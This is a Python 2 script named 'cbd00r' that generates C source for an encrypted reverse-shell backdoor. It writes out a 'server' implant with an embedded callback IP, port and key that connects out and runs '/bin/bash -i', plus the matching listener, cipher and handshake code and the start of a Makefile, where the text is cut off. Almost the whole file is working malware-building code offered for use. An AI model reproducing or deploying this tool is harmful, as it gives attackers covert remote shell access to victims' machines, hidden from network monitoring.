#!/usr/bin/python

import argparse, tarfile, os, random, string, urllib2

print '''      _         _  ___   ___       
  ___| |__   __| |/ _ \ / _ \ _ __ 
 / __| '_ \ / _` | | | | | | | '__|
| (__| |_) | (_| | |_| | |_| | |   
 \___|_.__/ \__,_|\___/ \___/|_|   
                  
                    by d4rkcat
'''

parser = argparse.ArgumentParser(prog='cbd00r', usage='./cbd00r.py')
parser.add_argument('-c', "--ip", type=str, help='Callback IP/URL')
parser.add_argument('-p', "--cport", type=str, help='Callback Port')
parser.add_argument('-l', "--lport", type=str, help='Listener Port')
parser.add_argument('-k', "--key", type=str, help='Secret Key')
args = parser.parse_args()
lstchk = False

if args.ip:
	callbackip = args.ip
else:
	req = urllib2.Request('http://icanhazip.com')
	response = urllib2.urlopen(req)
	callbackip = response.read().strip("\n")

os.system("rm -rf listener.tar.gz")
os.system("rm -rf server.tar.gz")
os.system("rm -rf srv")
os.system("rm -rf lst")
def mksrv():
	try:
		os.system("mkdir -p srv")
		callback = str('a[2] = "') + callbackip + str('";')
		if args.cport:
			port = str('a[3] = "-p";') + str('a[4] = "') + args.cport + str('";')
		else:
			global portn
			portn = random.randint(4000,40000)
			port = str('a[3] = "-p";') + str('a[4] = "') + str(portn) + str('";')
		if args.key:
			key = str('a[5] = "-k";') + str('a[6] = "') + args.key + str('";')
			if args.cport:
				print ' [*] Server Settings:\n IP:\t' + callbackip + '\n Port:\t' + args.cport + '\n Key:\t' + args.key + '\n'
			else:
				print ' [*] Server Settings:\n IP:\t' + callbackip + '\n Port:\t' + str(portn) + '\n Key:\t' + args.key + '\n'
		else:
			global keyi
			lst = [random.choice(string.ascii_letters + string.digits + '!?|/.,<>@#$%^&*(){}[]~:;_+=-` ') for n in xrange(random.randint(60,150))]
			keyi = "".join(lst)
			key = str('a[5] = "-k";') + str('a[6] = "') + keyi + str('";')
			if args.cport:
				print ' [*] Server Settings:\n IP:\t' + callbackip + '\n Port:\t' + args.cport + '\n Key:\t' + keyi + '\n'
			else:
				print ' [*] Server Settings:\n IP:\t' + callbackip + '\n Port:\t' + str(portn) + '\n Key:\t' + keyi + '\n'
	except:
		parser.print_help()
		exit()
	top = '''#include "iocom.h"
int main(int argc, char **argv){argc = 8; char *a[argc];a[0] = argv[0];a[1] = "-c";'''
	bottom = '''a[7] = "/bin/bash -i";argv = a;int st;int keyset = 0;int port = 0xCB0;char *host = NULL;cb0cat_t *cx = NULL;if ((cx = malloc(sizeof(cb0cat_t))) == NULL)return CBERRNO;memset(cx, 0x00, sizeof(cb0cat_t));cx->sck = 0;cx->fdi = STDIN_FILENO;cx->fdo = STDOUT_FILENO;do {st = getopt(argc, argv, "c:k:p:q");switch (st) {case 'c': if (host != NULL) {goto cleanup;}if ((host = strdup(optarg)) == NULL)goto cleanup;break;case 'k':  cbeam_clr(&cx->cbx);cbeam_put(&cx->cbx, BLNK_HSH, (const uint8_t *) optarg, strlen(optarg));cbeam_pad(&cx->cbx, BLNK_HSH | BLNK_IN);if (keyset) {if (cbeam_cmp(&cx->cbx, BLNK_HSH, cx->key, KEY_SIZE)) {goto cleanup;}} else {cbeam_get(&cx->cbx, BLNK_HSH, cx->key, KEY_SIZE);keyset = 1;}break;case 'p':port = atoi(optarg);break;case -1:break;default:case '?':goto cleanup;}} while (st != -1);if (optind < argc) {st = iocom_exec(cx, argv[optind]);if (st != 0)goto cleanup;st = iocom_client(cx, host, port);goto cleanup;}st = 0;cleanup:if (cx->sck != 0)close(cx->sck);if (cx->fdi != STDIN_FILENO)close(cx->fdi);if (cx->fdo != STDOUT_FILENO)close(cx->fdo);if (host != NULL)free(host);if (cx != NULL) {memset(cx, 0x00, sizeof(cb0cat_t));free(cx);}return st;}'''
	mainc = top + callback + port + key + bottom
	fp = open('srv/main.c', 'w')
	fp.write(mainc)
	fp.close()
	print ' [*] main.c generated'
	iocomc = '''#include "cblnk.h"
#include "iocom.h"
int iocom_exec(cb0cat_t *cx, char *cmd){int pipi[2], pipo[2];pid_t pid;if (pipe(pipi) != 0 || pipe(pipo) != 0) {return CBERRNO;}pid = fork();if (pid == -1) {return CBERRNO;}if (pid == 0) {if (dup2(pipi[0], STDIN_FILENO) == -1 ||dup2(pipo[1], STDOUT_FILENO) == -1 ||dup2(pipo[1], STDERR_FILENO) == -1) {  return CBERRNO;}  close(pipi[0]);close(pipo[1]);close(pipi[1]);close(pipo[0]);execl("/bin/sh", "sh", "-c", cmd, (char*) 0);exit(-1);}close(pipi[0]);close(pipo[1]);cx->fdi = pipo[0];cx->fdo = pipi[1];return 0;}int iocom_comms(cb0cat_t *cx, int here, int there){int n, timeout;struct timeval tv;fd_set rdset;const int wait_us[11] = { 0, 1000, 2000, 5000, 10000, 20000, 50000, 100000, 200000, 500000, 1000000 };timeout = 0;cx->run = 1;if ((here & BLNK_A) == BLNK_A) { if (cblnk_send(cx, here, 0) != 0) {cx->run = 0;} }while (cx->run) {if ((n = cblnk_recv(cx, there)) < 0)break;if (n > 0) {if (write(cx->fdo, cx->xfr, n) != n)break;fsync(cx->fdo);timeout = 0;} else {if (timeout < 10)timeout++;}FD_ZERO(&rdset);FD_SET(cx->fdi, &rdset); tv.tv_sec = wait_us[timeout] / 1000000;tv.tv_usec = wait_us[timeout] % 1000000; if ((n = select(cx->fdi + 1, &rdset, NULL, NULL, &tv)) < 0)break;if (n > 0) {if ((n = read(cx->fdi, cx->xfr, XFR_SIZE)) < 0)break;if (n == 0) {  cblnk_term(cx, here);break;}timeout = 0;} else {n = 0;}if (cblnk_send(cx, here, n) != n)break;}if (cx->run) {return CBERRNO;}return 0;}int iocom_client(cb0cat_t *cx, char *hostname, int port){struct hostent *he;struct sockaddr_in addr;uint32_t host = INADDR_LOOPBACK;const uint8_t aliceid[16] = "sup..XP";if ((he = gethostbyname(hostname)) == NULL) {perror(hostname);return CBERRNO;}if (he->h_addrtype != AF_INET || he->h_length != 4) {return CBERRNO;}host = ntohl(*((uint32_t *) (he->h_addr)));if ((cx->sck = socket(AF_INET, SOCK_STREAM, 0)) < 0) {return CBERRNO;}memset(&addr, 0, sizeof(addr));addr.sin_family = AF_INET;addr.sin_addr.s_addr = htonl(host);addr.sin_port = htons(port);if (connect(cx->sck, (struct sockaddr *) &addr, sizeof(addr)) < 0) {return CBERRNO;}if (cblnk_hand(cx, aliceid) < 0 ||cblnk_shake_alice(cx, aliceid) < 0) return CBERRNO;iocom_comms(cx, BLNK_A, BLNK_B);return 0;}'''
	fp = open('srv/iocom.c', 'w')
	fp.write(iocomc)
	fp.close()
	print ' [*] iocom.c generated'
	writemain()

def mklst():
	os.system("mkdir -p lst")
	top = '''#include "iocom.h"
int main(int argc, char **argv){argc = 6; char *a[argc]; a[0] = argv[0]; a[1] = "-l"; a[2] = "-p";'''
	if args.lport:
		port = str('a[3] = "') + args.lport + str('";')
	else:
		portn = random.randint(4000,40000)
		port = str('a[3] = "') + str(portn) + str('";')
	if args.key:
		key = str('a[4] = "-k";') + str('a[5] = "') + args.key + str('";')
		if args.lport:
			print '\n\n [*] Listener Settings:\n IP:\t0.0.0.0\n Port:\t' + args.lport + '\n Key:\t' + args.key + '\n'
		else:
			print '\n\n [*] Listener Settings:\n IP:\t0.0.0.0\n Port:\t' + str(portn) + '\n Key:\t' + args.key + '\n'
	else:
		key = str('a[4] = "-k";') + str('a[5] = "') + keyi + str('";')
		if args.lport:
			print '\n\n [*] Listener Settings:\n IP:\t0.0.0.0\n Port:\t' + args.lport + '\n Key:\t' + keyi + '\n'
		else:
			print '\n\n [*] Listener Settings:\n IP:\t0.0.0.0\n Port:\t' + str(portn) + '\n Key:\t' + keyi + '\n'
	global lstchk
	lstchk = True
	bottom = '''argv = a;int st; int keyset = 0;int port = 0xCB0; char *host = NULL;cb0cat_t *cx = NULL;if ((cx = malloc(sizeof(cb0cat_t))) == NULL)return CBERRNO;memset(cx, 0x00, sizeof(cb0cat_t));cx->sck = 0;cx->fdi = STDIN_FILENO;cx->fdo = STDOUT_FILENO;do {st = getopt(argc, argv, "c:k:lp:q");switch (st) {case 'l': break;case 'k':  cbeam_clr(&cx->cbx);cbeam_put(&cx->cbx, BLNK_HSH, (const uint8_t *) optarg, strlen(optarg));cbeam_pad(&cx->cbx, BLNK_HSH | BLNK_IN);if (keyset) {if (cbeam_cmp(&cx->cbx, BLNK_HSH, cx->key, KEY_SIZE)) {goto cleanup;}} else {cbeam_get(&cx->cbx, BLNK_HSH, cx->key, KEY_SIZE);keyset = 1;}break;case 'p':port = atoi(optarg);break;case -1:break;default:case '?':fprintf(stderr, "0o");goto cleanup;}} while (st != -1);if (optind < argc) {st = iocom_exec(cx, argv[optind]);if (st != 0)goto cleanup;}st = iocom_server(cx, port);goto cleanup;  st = 0;cleanup:if (cx->sck != 0)close(cx->sck);if (cx->fdi != STDIN_FILENO)close(cx->fdi);if (cx->fdo != STDOUT_FILENO)close(cx->fdo);if (host != NULL)free(host);if (cx != NULL) {memset(cx, 0x00, sizeof(cb0cat_t));free(cx);} return st;}'''
	mainc = top + port + key + bottom
	fp = open('lst/main.c', 'w')
	fp.write(mainc)
	fp.close()
	print ' [*] main.c generated'
	iocomc = '''#include "cblnk.h"
#include "iocom.h"
int iocom_hash(cb0cat_t *cx){int len;while ((len = read(cx->fdi, cx->xfr, XFR_SIZE)) > 0) {cbeam_put(&cx->cbx, BLNK_HSH, cx->xfr, len);}cbeam_pad(&cx->cbx, BLNK_HSH | BLNK_IN);return 0;}int iocom_enc(cb0cat_t *cx){int len;cbeam_clr(&cx->cbx);cbeam_put(&cx->cbx, BLNK_KEY | BLNK_IN, cx->key, KEY_SIZE);cbeam_pad(&cx->cbx, BLNK_KEY | BLNK_IN);cblnk_rand(cx->nnc, NNC_SIZE);cbeam_put(&cx->cbx, BLNK_NNC | BLNK_IN, cx->nnc, NNC_SIZE);cbeam_pad(&cx->cbx, BLNK_NNC | BLNK_IN);if (write(cx->fdo, cx->nnc, NNC_SIZE) != NNC_SIZE) {perror("Error writing nonce");return CBERRNO;}while (1) {len = read(cx->fdi, cx->xfr, XFR_SIZE);cblnk_lbf_put64(cx, len, 0);if (write(cx->fdo, cx->lbf, LBF_SIZE) != LBF_SIZE) {perror("Error writing chunk length");return CBERRNO;}if (len <= 0)break;cbeam_enc(&cx->cbx, BLNK_ENC, cx->xfr, cx->xfr, len);cbeam_pad(&cx->cbx, BLNK_ENC | BLNK_IN | BLNK_OUT);if (write(cx->fdo, cx->xfr, len) != len) {perror("Error writing chunk");return CBERRNO;}cbeam_get(&cx->cbx, BLNK_MAC, cx->mac, MAC_SIZE);cbeam_pad(&cx->cbx, BLNK_MAC | BLNK_OUT);if (write(cx->fdo, cx->mac, MAC_SIZE) != MAC_SIZE) {perror("Error writing MAC");return CBERRNO;}} cbeam_get(&cx->cbx, BLNK_MAC | BLNK_FIN, cx->mac, MAC_SIZE);cbeam_pad(&cx->cbx, BLNK_MAC | BLNK_FIN | BLNK_OUT);if (write(cx->fdo, cx->mac, MAC_SIZE) != MAC_SIZE) {perror("Error writing Final MAC");return CBERRNO;}return 0;}int iocom_dec(cb0cat_t *cx){int len;cbeam_clr(&cx->cbx);cbeam_put(&cx->cbx, BLNK_KEY | BLNK_IN, cx->key, KEY_SIZE);cbeam_pad(&cx->cbx, BLNK_KEY | BLNK_IN);if (read(cx->fdi, cx->nnc, NNC_SIZE) != NNC_SIZE) {perror("Error reading nonce");return CBERRNO;} cbeam_put(&cx->cbx, BLNK_NNC | BLNK_IN, cx->nnc, NNC_SIZE);cbeam_pad(&cx->cbx, BLNK_NNC | BLNK_IN);while (1) {if (read(cx->fdi, cx->lbf, LBF_SIZE) != LBF_SIZE) {perror("Error reading chunk size");return CBERRNO; } len = cblnk_lbf_get64(cx, 0);if (len < 0 || len > XFR_SIZE) {return 3;}if (len == 0)  break;if (read(cx->fdi, cx->xfr, len) != len) {perror("Error reading encrypted chunk");return CBERRNO; }cbeam_dec(&cx->cbx, BLNK_ENC, cx->xfr, cx->xfr, len);cbeam_pad(&cx->cbx, BLNK_ENC | BLNK_IN | BLNK_OUT);if (read(cx->fdi, cx->mac, MAC_SIZE) != MAC_SIZE) {perror("Error reading MAC");return CBERRNO;}if (cbeam_cmp(&cx->cbx, BLNK_MAC, cx->mac, MAC_SIZE) != 0) {return CBERRNO; } cbeam_pad(&cx->cbx, BLNK_MAC | BLNK_OUT);if (write(cx->fdo, cx->xfr, len) != len) {perror("Plaintext write error");return CBERRNO;}}if (read(cx->fdi, cx->mac, MAC_SIZE) != MAC_SIZE) {perror("Error reading final MAC");return CBERRNO;}if (cbeam_cmp(&cx->cbx, BLNK_MAC | BLNK_FIN, cx->mac, MAC_SIZE) != 0) {return CBERRNO; } cbeam_pad(&cx->cbx, BLNK_MAC | BLNK_FIN | BLNK_OUT);return 0;}int iocom_exec(cb0cat_t *cx, char *cmd){int pipi[2], pipo[2];pid_t pid;if (pipe(pipi) != 0 || pipe(pipo) != 0) {perror("pipe()");return CBERRNO;}pid = fork();if (pid == -1) {perror("fork()");return CBERRNO;}if (pid == 0) {if (dup2(pipi[0], STDIN_FILENO) == -1 ||dup2(pipo[1], STDOUT_FILENO) == -1 ||dup2(pipo[1], STDERR_FILENO) == -1) {perror("dup2() in child");return CBERRNO; }close(pipi[0]);close(pipo[1]);close(pipi[1]);close(pipo[0]);execl("/bin/sh", "sh", "-c", cmd, (char*) 0);exit(-1);}close(pipi[0]);close(pipo[1]);cx->fdi = pipo[0];cx->fdo = pipi[1];return 0;}int iocom_comms(cb0cat_t *cx, int here, int there){int n, timeout;struct timeval tv;fd_set rdset;const int wait_us[11] = { 0, 1000, 2000, 5000, 10000, 20000, 50000, 100000, 200000, 500000, 1000000 };timeout = 0;cx->run = 1;if ((here & BLNK_A) == BLNK_A) {if (cblnk_send(cx, here, 0) != 0) {perror("cblnk_send(0)");cx->run = 0;}}while (cx->run) {if ((n = cblnk_recv(cx, there)) < 0)break;if (n > 0) {if (write(cx->fdo, cx->xfr, n) != n)break;fsync(cx->fdo);timeout = 0;} else {if (timeout < 10)  timeout++;}FD_ZERO(&rdset);FD_SET(cx->fdi, &rdset); tv.tv_sec = wait_us[timeout] / 1000000;tv.tv_usec = wait_us[timeout] % 1000000;if ((n = select(cx->fdi + 1, &rdset, NULL, NULL, &tv)) < 0)break;if (n > 0) {if ((n = read(cx->fdi, cx->xfr, XFR_SIZE)) < 0)break;if (n == 0) { cblnk_term(cx, here);break;}timeout = 0;} else {n = 0;}if (cblnk_send(cx, here, n) != n)break;}if (cx->run) {perror("comms()");return CBERRNO;}return 0;}int iocom_server(cb0cat_t *cx, int portno){int sock;socklen_t sl;struct sockaddr_in sin;const uint8_t bobbyid[16] = "Yo#.-%";if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {perror("socket()");return CBERRNO;}memset(&sin, 0, sizeof(sin));sin.sin_family = AF_INET;sin.sin_addr.s_addr = htonl(INADDR_ANY);sin.sin_port = htons(portno);if (bind(sock, (struct sockaddr *) &sin, sizeof(sin)) != 0) {perror("bind()");return CBERRNO;}if (listen(sock, 1) != 0) {perror("listen()");return CBERRNO;}signal(SIGCHLD, SIG_IGN);sl = sizeof(sin);if ((cx->sck = accept(sock, (struct sockaddr *) &sin, &sl)) < 0) {perror("accept()");return CBERRNO;}close(sock);if (cblnk_hand(cx, bobbyid) < 0 ||cblnk_shake_bobby(cx, bobbyid) < 0)return CBERRNO;iocom_comms(cx, BLNK_B, BLNK_A);return 0;}'''
	fp = open('lst/iocom.c', 'w')
	fp.write(iocomc)
	fp.close()
	print ' [*] iocom.c generated'
	writemain()

def writemain():
	cbeamc = '''#include "cbeam.h"
void cbeam_clr(cbeam_t *cb){cb->st.q[0] = 0;cb->st.q[1] = 0;cb->st.q[2] = 0;cb->st.q[3] = 0;cb->len = 0;}void cbeam_pad(cbeam_t *cb, uint16_t fl){fl |= BLNK_PAD;if (cb->len >= 8) {fl |= BLNK_FLL;} else {cb->st.b[cb->len] ^= 0x01;}cb->st.w[4] ^= fl;cbeam_mx6(&cb->st);cb->len = 0;}void cbeam_put(cbeam_t *cb, uint16_t fl, const void *in, size_t len){int j;size_t i;j = cb->len;fl |= BLNK_IN;for (i = 0; i < len; i++) {if (j >= 8) {cb->st.w[4] ^= fl;cbeam_mx6(&cb->st);j = 0;}cb->st.b[j++] ^= ((const uint8_t *) in)[i]; }cb->len = j;}void cbeam_get(cbeam_t *cb, uint16_t fl, void *out, size_t len){int j;size_t i;j = cb->len;fl |= BLNK_OUT;for (i = 0; i < len; i++) {if (j >= 8) {cb->st.w[4] ^= fl;cbeam_mx6(&cb->st);j = 0;}((uint8_t *) out)[i] = cb->st.b[j++]; }cb->len = j;}int cbeam_cmp(cbeam_t *cb, uint16_t fl, const void *in, size_t len){int d, j;size_t i;j = cb->len;fl |= BLNK_OUT;d = 0;for (i = 0; i < len; i++) {if (j >= 8) {cb->st.w[4] ^= fl;cbeam_mx6(&cb->st);j = 0;}if (d == 0)d = ((int) ((const uint8_t *) in)[i]) - ((int) cb->st.b[j]);j++;}cb->len = j;return d;}void cbeam_enc(cbeam_t *cb, uint16_t fl, void *out, const void *in, size_t len){int j;size_t i;j = cb->len;fl |= BLNK_IN | BLNK_OUT;for (i = 0; i < len; i++) {if (j >= 8) {cb->st.w[4] ^= fl;cbeam_mx6(&cb->st);j = 0;}cb->st.b[j] ^= ((const uint8_t *) in)[i];((uint8_t *) out)[i] = cb->st.b[j++]; }cb->len = j;}void cbeam_dec(cbeam_t *cb, uint16_t fl, void *out, const void *in, size_t len){int j;size_t i;uint8_t x;j = cb->len;fl |= BLNK_IN | BLNK_OUT;for (i = 0; i < len; i++) {if (j >= 8) {cb->st.w[4] ^= fl;cbeam_mx6(&cb->st);j = 0;}x = ((const uint8_t *) in)[i];((uint8_t *) out)[i] = x ^ cb->st.b[j];cb->st.b[j++] = x;}cb->len = j;}'''
	if lstchk:
		fp = open('lst/cbeam.c', 'w')
	else:
		fp = open('srv/cbeam.c', 'w')
	fp.write(cbeamc)
	fp.close()
	print ' [*] cbeam.c generated'
	cbeamh = '''#ifndef CBEAM_H
#define CBEAM_H
#include <stdio.h>
#include <stdint.h>
#ifdef __AVX2__
#include <immintrin.h>
#endif
typedef union w256 {uint8_t b[32];uint16_t w[16];uint32_t d[8];uint64_t q[4];
#ifdef __AVX2__
__m256i y;
#endif
} cbeam_w256;typedef struct {cbeam_w256 st;unsigned len;} cbeam_t;
#define BLNK_FLL    0x0001  
#define BLNK_PAD    0x0002 
#define BLNK_IN     0x0004 
#define BLNK_OUT    0x0008 
#define BLNK_AAD    0x0010  
#define BLNK_KEY    0x0020 
#define BLNK_NNC    0x0040 
#define BLNK_ENC    0x0080 
#define BLNK_HSH    0x0100 
#define BLNK_MAC    0x0200  
#define BLNK_STR    0x0400  
#define BLNK_RNG    0x0800 
#define BLNK_A      0x1000 
#define BLNK_B      0x2000
#define BLNK_CHN    0x4000  
#define BLNK_FIN    0x8000  
void cbeam_mx6(cbeam_w256 *cb); void cbeam_clr(cbeam_t *cb); void cbeam_pad(cbeam_t *cb, uint16_t fl);void cbeam_put(cbeam_t *cb, uint16_t fl, const void *in, size_t len);void cbeam_get(cbeam_t *cb, uint16_t fl, void *out, size_t len);int cbeam_cmp(cbeam_t *cb, uint16_t fl, const void *in, size_t len);void cbeam_enc(cbeam_t *cb, uint16_t fl, void *out, const void *in, size_t len);void cbeam_dec(cbeam_t *cb, uint16_t fl, void *out, const void *in, size_t len);
#endif
'''
	if lstchk:
		fp = open('lst/cbeam.h', 'w')
	else:
		fp = open('srv/cbeam.h', 'w')
	fp.write(cbeamh)
	fp.close()
	print ' [*] cbeam.h generated'

	cblinkc = '''#include "cblnk.h"
uint64_t cblnk_lbf_get64(cb0cat_t *cx, int from){int i;uint64_t x;cbeam_dec(&cx->cbx, BLNK_AAD | from, cx->lbf, cx->lbf, LBF_SIZE);cbeam_pad(&cx->cbx, BLNK_AAD | BLNK_ENC | BLNK_IN | BLNK_OUT | from);x = 0;for (i = 0; i < LBF_SIZE; i++) {x += ((uint64_t) cx->lbf[i]) << (8lu * i);}if (x == CBLNK_TERMINATE) {x = 0;cx->run = 0;}return x;}void cblnk_lbf_put64(cb0cat_t *cx, uint64_t x, int from){int i;for (i = 0; i < 8; i++) {cx->lbf[i] = x & 0xFF;x >>= 8lu;}cbeam_enc(&cx->cbx, BLNK_AAD | from, cx->lbf, cx->lbf, LBF_SIZE);cbeam_pad(&cx->cbx, BLNK_AAD | BLNK_ENC | BLNK_IN | BLNK_OUT | from);}int cblnk_rand(void *buf, int len){int fd;if ((fd = open("/dev/urandom", O_RDONLY)) == -1)return CBERRNO; if (read(fd, buf, len) != len)return CBERRNO;close(fd);return 0;}int block_send(cb0cat_t *cx, const void *buf, int len){int i, n;for (i = 0; i < len; i += n) {n = send(cx->sck, &((const char *) buf)[i], len - i, 0);if (n == 0)return i;if (n < 0) {if (errno == EAGAIN || errno == EWOULDBLOCK) {usleep(10000);n = 0;} else {return i;}}}return len;}int block_recv(cb0cat_t *cx, void *buf, int len){int i, n;for (i = 0; i < len; i += n) {n = recv(cx->sck, &((char *) buf)[i], len - i, 0);if (n == 0)return i;if (n < 0) {if (errno == EAGAIN || errno == EWOULDBLOCK) {n = 0;} else {return i;}}usleep(10000);}return len;}int cblnk_send(cb0cat_t *cx, int from, int len){cblnk_lbf_put64(cx, len, from);if (block_send(cx, cx->lbf, LBF_SIZE) != LBF_SIZE)return CBERRNO;if (len > 0) {cbeam_enc(&cx->cbx, from, cx->xfr, cx->xfr, len);cbeam_pad(&cx->cbx, BLNK_ENC | BLNK_IN | BLNK_OUT | from);if (block_send(cx, cx->xfr, len) != len)return CBERRNO;} cbeam_get(&cx->cbx, BLNK_MAC | from, cx->mac, MAC_SIZE);cbeam_pad(&cx->cbx, BLNK_MAC | BLNK_OUT | from);if (block_send(cx, cx->mac, MAC_SIZE) != MAC_SIZE)return CBERRNO;return len;}int cblnk_term(cb0cat_t *cx, int from){cx->run = 0;cblnk_lbf_put64(cx, CBLNK_TERMINATE, from);if (block_send(cx, cx->lbf, LBF_SIZE) != LBF_SIZE)return CBERRNO;cbeam_get(&cx->cbx, BLNK_MAC | from, cx->mac, MAC_SIZE);cbeam_pad(&cx->cbx, BLNK_MAC | BLNK_OUT | from);if (block_send(cx, cx->mac, MAC_SIZE) != MAC_SIZE)return CBERRNO;return 0;}int cblnk_recv(cb0cat_t *cx, int from){int len; if (block_recv(cx, cx->lbf, LBF_SIZE) != LBF_SIZE)return CBERRNO;len = cblnk_lbf_get64(cx, from);if (len < 0 || len > XFR_SIZE)return CBERRNO;if (len > 0) {if (block_recv(cx, cx->xfr, len) != len)return CBERRNO;cbeam_dec(&cx->cbx, from, cx->xfr, cx->xfr, len);cbeam_pad(&cx->cbx, BLNK_ENC | BLNK_IN | BLNK_OUT | from);} if (block_recv(cx, cx->mac, MAC_SIZE) != MAC_SIZE)return CBERRNO;if (cbeam_cmp(&cx->cbx, BLNK_MAC | from, cx->mac, MAC_SIZE) != 0)return CBERRNO;cbeam_pad(&cx->cbx, BLNK_MAC | BLNK_OUT | from);return len;}int cblnk_hand(cb0cat_t *cx, const uint8_t *myid){if (block_send(cx, myid, IDN_SIZE) != IDN_SIZE)return CBERRNO;cblnk_rand(cx->nnc, NNC_SIZE);if (block_send(cx, cx->nnc, NNC_SIZE) != NNC_SIZE)return CBERRNO;if (block_recv(cx, cx->idn, IDN_SIZE) != IDN_SIZE)return CBERRNO;if (block_recv(cx, cx->xfr, NNC_SIZE) != NNC_SIZE)return CBERRNO;return 0;}int cblnk_shake_alice(cb0cat_t *cx, const uint8_t *aliceid){cbeam_clr(&cx->cbx);cbeam_put(&cx->cbx, BLNK_AAD | BLNK_A, aliceid, IDN_SIZE);cbeam_pad(&cx->cbx, BLNK_AAD | BLNK_A | BLNK_IN);cbeam_put(&cx->cbx, BLNK_AAD | BLNK_B, cx->idn, IDN_SIZE);cbeam_pad(&cx->cbx, BLNK_AAD | BLNK_B | BLNK_IN);cbeam_put(&cx->cbx, BLNK_NNC | BLNK_A, cx->nnc, NNC_SIZE);cbeam_pad(&cx->cbx, BLNK_NNC | BLNK_A | BLNK_IN); cbeam_put(&cx->cbx, BLNK_NNC | BLNK_B, cx->xfr, NNC_SIZE);cbeam_pad(&cx->cbx, BLNK_NNC | BLNK_B | BLNK_IN);cbeam_put(&cx->cbx, BLNK_KEY | BLNK_A | BLNK_B, cx->key, KEY_SIZE);cbeam_pad(&cx->cbx, BLNK_KEY | BLNK_A | BLNK_B | BLNK_IN);cbeam_get(&cx->cbx, BLNK_MAC | BLNK_A, cx->mac, MAC_SIZE);cbeam_pad(&cx->cbx, BLNK_MAC | BLNK_OUT | BLNK_A);if (block_send(cx, cx->mac, MAC_SIZE) != MAC_SIZE)return CBERRNO;if (block_recv(cx, cx->mac, MAC_SIZE) != MAC_SIZE)return CBERRNO;if (cbeam_cmp(&cx->cbx, BLNK_MAC | BLNK_B, cx->mac, MAC_SIZE) != 0) {return CBERRNO;}cbeam_pad(&cx->cbx, BLNK_MAC | BLNK_OUT | BLNK_B);return 0;}int cblnk_shake_bobby(cb0cat_t *cx, const uint8_t *bobbyid){cbeam_clr(&cx->cbx);cbeam_put(&cx->cbx, BLNK_AAD | BLNK_A, cx->idn, IDN_SIZE);cbeam_pad(&cx->cbx, BLNK_AAD | BLNK_A | BLNK_IN);cbeam_put(&cx->cbx, BLNK_AAD | BLNK_B, bobbyid, IDN_SIZE);cbeam_pad(&cx->cbx, BLNK_AAD | BLNK_B | BLNK_IN);cbeam_put(&cx->cbx, BLNK_NNC | BLNK_A, cx->xfr, NNC_SIZE);cbeam_pad(&cx->cbx, BLNK_NNC | BLNK_A | BLNK_IN); cbeam_put(&cx->cbx, BLNK_NNC | BLNK_B, cx->nnc, NNC_SIZE);cbeam_pad(&cx->cbx, BLNK_NNC | BLNK_B | BLNK_IN);cbeam_put(&cx->cbx, BLNK_KEY | BLNK_A | BLNK_B, cx->key, KEY_SIZE);cbeam_pad(&cx->cbx, BLNK_KEY | BLNK_A | BLNK_B | BLNK_IN);if (block_recv(cx, cx->mac, MAC_SIZE) != MAC_SIZE)return CBERRNO;if (cbeam_cmp(&cx->cbx, BLNK_MAC | BLNK_A, cx->mac, MAC_SIZE) != 0) {cblnk_rand(cx->xfr, MAC_SIZE);if (block_send(cx, cx->xfr, MAC_SIZE) != MAC_SIZE)return CBERRNO;return CBERRNO;}cbeam_pad(&cx->cbx, BLNK_MAC | BLNK_OUT | BLNK_A);cbeam_get(&cx->cbx, BLNK_MAC | BLNK_B, cx->mac, MAC_SIZE);cbeam_pad(&cx->cbx, BLNK_MAC | BLNK_OUT | BLNK_B);if (block_send(cx, cx->mac, MAC_SIZE) != MAC_SIZE)return CBERRNO;return 0;}
'''
	if lstchk:
		fp = open('lst/cblnk.c', 'w')
	else:
		fp = open('srv/cblnk.c', 'w')
	fp.write(cblinkc)
	fp.close()
	print ' [*] cblnk.c generated'

	cblinkh = '''#ifndef CBLNK_H
#define CBLNK_H
#include "cbeam.h"
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#ifndef CBERRNO
#ifdef __LINE__
#define CBERRNO (-(__LINE__))
#else
#define CBERRNO (-1)
#endif
#endif
#ifndef CBLNK_TERMINATE
#define CBLNK_TERMINATE (~0lu)
#endif
#define KEY_SIZE 24
#define NNC_SIZE 16
#define IDN_SIZE 16
#define MAC_SIZE 16
#define LBF_SIZE 8
#define XFR_SIZE 0x10000
typedef struct {int sck; int fdi, fdo; int run; cbeam_t cbx; uint8_t idn[IDN_SIZE]; uint8_t key[KEY_SIZE]; uint8_t mac[MAC_SIZE];uint8_t lbf[LBF_SIZE]; uint8_t nnc[NNC_SIZE];char xfr[XFR_SIZE];} cb0cat_t;int block_send(cb0cat_t *cx, const void *buf, int len);int block_recv(cb0cat_t *cx, void *buf, int len);int cblnk_send(cb0cat_t *cx, int from, int len);int cblnk_recv(cb0cat_t *cx, int from);int cblnk_term(cb0cat_t *cx, int from);int cblnk_hand(cb0cat_t *cx, const uint8_t *myid);int cblnk_shake_alice(cb0cat_t *cx, const uint8_t *alice);int cblnk_shake_bobby(cb0cat_t *cx, const uint8_t *bobby);int cblnk_rand(void *buf, int len);uint64_t cblnk_lbf_get64(cb0cat_t *cx, int from);void cblnk_lbf_put64(cb0cat_t *cx, uint64_t x, int from);int cblnk_selftest(cb0cat_t *cx);
#endif
'''
	if lstchk:
		fp = open('lst/cblnk.h', 'w')
	else:
		fp = open('srv/cblnk.h', 'w')
	fp.write(cblinkh)
	fp.close()
	print ' [*] cblnk.h generated'

	iocomh = '''#ifndef IOCOM_H
#define IOCOM_H
#include "cblnk.h"
int iocom_hash(cb0cat_t *cx);int iocom_enc(cb0cat_t *cx);int iocom_dec(cb0cat_t *cx);int iocom_client(cb0cat_t *cx, char *hostname, int port);int iocom_server(cb0cat_t *cx, int portno);int iocom_exec(cb0cat_t *cx, char *cmd);
#endif
'''
	if lstchk:
		fp = open('lst/iocom.h', 'w')
	else:
		fp = open('srv/iocom.h', 'w')
	fp.write(iocomh)
	fp.close()
	print ' [*] iocom.h generated'

	if lstchk:
		fname = 'listener'
	else:
		fname = 'server'
	makefiler = '''# Makefile

BINARY		= ''' + fname + '''
OBJS     	= main.o iocom.o cblnk.o cbeam.o mx6-gcc.o
DIST            = ''' + fname + '''
CC		= gcc
CFLAGS          = -Wall -O3
LIBS            =
LDFLAGS         =
INCLUDES        =

$(BINARY):      $(OBJS)
